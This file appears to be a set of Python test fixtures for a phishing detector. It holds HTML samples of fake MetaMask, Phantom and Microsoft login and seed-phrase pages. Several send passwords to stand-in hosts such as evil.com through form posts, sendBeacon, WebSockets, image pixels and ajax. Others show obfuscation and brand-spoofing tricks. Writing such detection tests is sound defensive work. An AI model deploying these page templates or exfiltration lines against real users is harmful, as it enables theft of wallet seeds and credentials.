"""Shared HTML fixtures for tests."""

CLEAN_HTML = """<!DOCTYPE html>
<html>
<head><title>My Arweave Blog Post</title></head>
<body>
  <h1>Welcome to my blog</h1>
  <p>This is a legitimate blog post stored on Arweave.</p>
  <p>Decentralized storage is the future of the web.</p>
</body>
</html>"""

SEED_PHRASE_PHISHING = """<!DOCTYPE html>
<html>
<head><title>MetaMask - Restore Wallet</title></head>
<body>
  <h1>MetaMask</h1>
  <h2>Enter your recovery phrase</h2>
  <p>Enter your 12-word seed phrase to restore your wallet.</p>
  <form action="https://evil.com/steal" method="POST">
    <input type="text" name="word1" placeholder="Word #1">
    <input type="text" name="word2" placeholder="Word #2">
    <input type="text" name="word3" placeholder="Word #3">
    <input type="text" name="word4" placeholder="Word #4">
    <input type="text" name="word5" placeholder="Word #5">
    <input type="text" name="word6" placeholder="Word #6">
    <input type="text" name="word7" placeholder="Word #7">
    <input type="text" name="word8" placeholder="Word #8">
    <input type="text" name="word9" placeholder="Word #9">
    <input type="text" name="word10" placeholder="Word #10">
    <input type="text" name="word11" placeholder="Word #11">
    <input type="text" name="word12" placeholder="Word #12">
    <button type="submit">Restore Wallet</button>
  </form>
</body>
</html>"""

EXTERNAL_FORM_PHISHING = """<!DOCTYPE html>
<html>
<head><title>Sign In</title></head>
<body>
  <h1>Login</h1>
  <form action="https://evil-collector.com/creds" method="POST">
    <input type="text" name="email" placeholder="Email">
    <input type="password" name="password" placeholder="Password">
    <button type="submit">Sign In</button>
  </form>
</body>
</html>"""

WALLET_IMPERSONATION_PHISHING = """<!DOCTYPE html>
<html>
<head><title>Phantom Wallet</title></head>
<body>
  <h1>Phantom</h1>
  <p>Import wallet using your secret recovery phrase</p>
  <form>
    <input type="password" name="key" placeholder="Enter private key">
    <button type="submit">Import</button>
  </form>
</body>
</html>"""

OBFUSCATED_LOADER_PHISHING = """<!DOCTYPE html>
<html>
<head><title>Loading...</title></head>
<body>
<script>
var encoded = "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB";
document.write(atob(encoded));
</script>
</body>
</html>"""

SEED_PHRASE_TEXTAREA_EVASION = """<!DOCTYPE html>
<html>
<head><title>Restore Wallet</title></head>
<body>
  <h2>Enter your recovery phrase</h2>
  <textarea name="word1" placeholder="Word 1"></textarea>
  <textarea name="word2" placeholder="Word 2"></textarea>
  <textarea name="word3" placeholder="Word 3"></textarea>
  <textarea name="word4" placeholder="Word 4"></textarea>
  <textarea name="word5" placeholder="Word 5"></textarea>
  <textarea name="word6" placeholder="Word 6"></textarea>
  <textarea name="word7" placeholder="Word 7"></textarea>
  <button type="submit">Restore</button>
</body>
</html>"""

SEED_PHRASE_CONTENTEDITABLE_EVASION = """<!DOCTYPE html>
<html>
<head><title>Import Wallet</title></head>
<body>
  <h2>Enter your 12-word seed phrase</h2>
  <div contenteditable="true" class="word-input" data-index="1"></div>
  <div contenteditable="true" class="word-input" data-index="2"></div>
  <div contenteditable="true" class="word-input" data-index="3"></div>
  <div contenteditable="true" class="word-input" data-index="4"></div>
  <div contenteditable="true" class="word-input" data-index="5"></div>
  <div contenteditable="true" class="word-input" data-index="6"></div>
  <div contenteditable="true" class="word-input" data-index="7"></div>
  <div contenteditable="true" class="word-input" data-index="8"></div>
  <button>Import</button>
</body>
</html>"""

SENDBEACON_EXFIL = """<!DOCTYPE html>
<html>
<head><title>Login</title></head>
<body>
  <input type="password" id="pw">
  <button onclick="go()">Login</button>
  <script>
  function go() {
    navigator.sendBeacon("https://evil.com/collect", document.getElementById("pw").value);
  }
  </script>
</body>
</html>"""

WEBSOCKET_EXFIL = """<!DOCTYPE html>
<html>
<head><title>Sign In</title></head>
<body>
  <input type="password" id="pw">
  <script>
  var ws = new WebSocket("wss://evil.com/ws");
  ws.onopen = function() { ws.send(document.getElementById("pw").value); };
  </script>
</body>
</html>"""

IMAGE_PIXEL_EXFIL = """<!DOCTYPE html>
<html>
<head><title>Login</title></head>
<body>
  <input type="password" id="pw">
  <script>
  new Image().src = "https://evil.com/track?pw=" + document.getElementById("pw").value;
  </script>
</body>
</html>"""

BRACKET_NOTATION_EXFIL = """<!DOCTYPE html>
<html>
<head><title>Login</title></head>
<body>
  <input type="password" name="pw">
  <script>
  $["ajax"]({url: "https://evil.com/steal", data: {p: $("input").val()}});
  </script>
</body>
</html>"""

PASSWORD_TEXTAREA_EXFIL = """<!DOCTYPE html>
<html>
<head><title>Login</title></head>
<body>
  <textarea id="password" placeholder="Enter password"></textarea>
  <form action="https://evil.com/collect" method="POST">
    <button>Submit</button>
  </form>
</body>
</html>"""

PASSWORD_CONTENTEDITABLE_EXFIL = """<!DOCTYPE html>
<html>
<head><title>Secure Login</title></head>
<body>
  <div contenteditable="true" id="passwd" aria-label="Password"></div>
  <script>
  $.ajax({url: "https://evil.com/steal", data: {p: document.getElementById("passwd").textContent}});
  </script>
</body>
</html>"""

WALLET_HOMOGLYPH_PHISHING = """<!DOCTYPE html>
<html>
<head><title>Met\u0430M\u0430sk</title></head>
<body>
  <h1>Met\u0430M\u0430sk</h1>
  <input type="password" placeholder="Password">
</body>
</html>"""

WALLET_SOFT_HYPHEN_PHISHING = """<!DOCTYPE html>
<html>
<head><title>Meta\u00admask</title></head>
<body>
  <h1>Meta\u00admask Login</h1>
  <input type="password" name="pw">
</body>
</html>"""

WALLET_SPLIT_BRAND_PHISHING = """<!DOCTYPE html>
<html>
<head><title>Meta Mask Wallet</title></head>
<body>
  <h1>Meta Mask</h1>
  <input type="password" name="key">
</body>
</html>"""

OBFUSCATED_BRACKET_NOTATION = """<!DOCTYPE html>
<html>
<body>
<script>
var x = "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB";
document["write"](window["atob"](x));
</script>
</body>
</html>"""

OBFUSCATED_UNICODE_ESCAPES = """<!DOCTYPE html>
<html>
<body>
<script>
var payload = "\\u0048\\u0065\\u006C\\u006C\\u006F\\u0057\\u006F\\u0072\\u006C\\u0064\\u0021\\u0048\\u0065\\u006C\\u006C\\u006F";
eval(decodeURIComponent(payload));
</script>
</body>
</html>"""

OBFUSCATED_FUNCTION_CONSTRUCTOR = """<!DOCTYPE html>
<html>
<body>
<script>
var encoded = "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB";
Function(atob(encoded))();
</script>
</body>
</html>"""

PROTOCOL_RELATIVE_EXFIL = """<!DOCTYPE html>
<html>
<head><title>Login</title></head>
<body>
  <form action="//evil.com/steal" method="POST">
    <input type="password" name="pw">
    <button>Login</button>
  </form>
</body>
</html>"""

NOT_HTML_CONTENT = b'{"name": "some json file", "value": 42}'

MINIMAL_HTML = """<html><body><p>Hello world</p></body></html>"""

MICROSOFT_PHISHING = """<!DOCTYPE html>
<html>
<head><title>Sign-In</title></head>
<body>
  <div class="MSLogo">
    <img src="logo.png" alt="Microsoft">
  </div>
  <h1>Sign In</h1>
  <p>Please wait...</p>
  <form action="https://coingrok.com/collect" method="POST">
    <input type="text" name="email" placeholder="Email">
    <input type="password" id="password" placeholder="Password">
    <button>Next</button>
  </form>
  <script>
    document.write(unescape('%3Cscript%3Ealert(1)%3C/script%3E'));
  </script>
</body>
</html>"""
